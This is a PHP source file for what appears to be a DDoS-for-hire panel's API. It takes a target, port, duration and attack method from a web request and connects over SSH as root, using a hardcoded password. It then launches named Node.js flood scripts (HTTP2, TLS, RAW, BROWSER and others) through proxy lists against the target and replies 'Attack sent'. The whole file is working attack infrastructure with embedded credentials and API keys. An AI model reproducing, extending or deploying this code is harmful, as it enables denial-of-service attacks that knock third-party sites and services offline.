 <?php
		include('Net/SSH2.php');

		$address = "localhost"; //Server IP (If same server use localhost)

		$serverPort = 22; //SSH port (Default 22)
		
		$user = "root"; //User for the server
		
		$password = "KyouraDDoS#"; //Password for the server
		
		$Methods = array("TLS", "HTTP-BOKEP", "TLSUA", "WIZARD", "BLACK-CHIP", "HTTP-BOKEP", "FLOOD", "FLOODV2", "BYPASS", "HTTP1", "CLUBER-LOST", "TLS-LOSTV2", "HTTP2", "RAW", "BROWSER");
		function generateRandomString($length = 10) { 
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $charactersLength = strlen($characters); 
    $randomString = ''; 
 
    for ($i = 0; $i < $length; $i++) { 
        $randomString .= $characters[mt_rand(0, $charactersLength - 1)]; 
    } 
 
    return $randomString; 
} 
       
       $randstr = generateRandomString();

		$APIKey = array("takyganzbanget", "zxkys6677"); //Your API Key

		$host = $_GET["host"];
		$port = intval($_GET['port']);
		$time = intval($_GET['time']);
		$method = $_GET["method"];

		$key = $_GET["key"];

		if (empty($host) | empty($port) | empty($time) | empty($method)) //Checking the fields
		{
			die("Please verify all fields");
		}

		if (!is_numeric($port) || !is_numeric($time)) 
		{
			die('Time and Port must be a number');
		}
	  
		if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL)) //Validating target
		{
			die('Please insert a correct IP address(v4)/URL..');
		}

		if($port < 1 && $port > 65535) //Validating port
		{
			die("Port is invalid");
		}

		if ($time < 1) //Validating time
		{
			die("Time is invalid");
		}

		if (!in_array($method, $Methods)) //Validating method
		{
			die("Method is invalid");
		}
		
		if (!in_array($key, $APIKey)) //Validating API Key
		{ 
			die("Invalid API Key");
		}

		$connection = ssh2_connect($address, $serverPort);
		if(ssh2_auth_password($connection, $user, $password))
		{
	    if($method == "HTTP2"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node http2.js $host 10 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}	
	    if($method == "HTTP-BOKEP"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node HTTP-BOKEP.js GET $host $time 10 30 proxy.txt --query 2 --delay 1 --referer rand")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
	    if($method == "RAW"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node raw.js GET $host $time 30 10 proxy.txt")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}	
	    if($method == "HTTP1"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node http1.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}	
        if($method == "WIZARD"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node wizard.js $host $time 55 5 proxy.txt")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}	
        if($method == "TLSVIP"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node tls.js $host $time 30 10 proxy.txt POST")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}	
        if($method == "BLACK-CHIP"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node black-chip.js $host $time 30 10 proxy.txt POST")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "FLOODV2"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node floodv2.js $host $time 30 10 proxy.txt GET")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "TLS"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node tls $host $time 30 10")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}	
        if($method == "BROWSER"){if(ssh2_exec($connection, "screen -dmS $randstr timeout $time node browser $host $time 50 5 proxy.txt")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}	
		}
		else
		{
			die("Could not login to remote server, this may be a error with the login cedentials.");
		}
	?>  